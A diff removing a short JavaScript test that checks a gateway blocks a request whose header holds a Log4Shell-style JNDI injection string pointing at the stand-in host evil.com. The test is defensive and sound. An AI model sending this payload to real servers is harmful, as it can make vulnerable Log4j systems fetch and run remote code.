@@ -1,7 +1,0 @@
-const helpers = require('./tests/chai-http');
-
-describe("Request should be blocked for jndi header", () => {
-  it('Request is blocked', () => { 
-    helpers.checkURL({ host: "http://httpbin.solo.io", path: '/anything', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], retCode: 403 });
-  });
-});
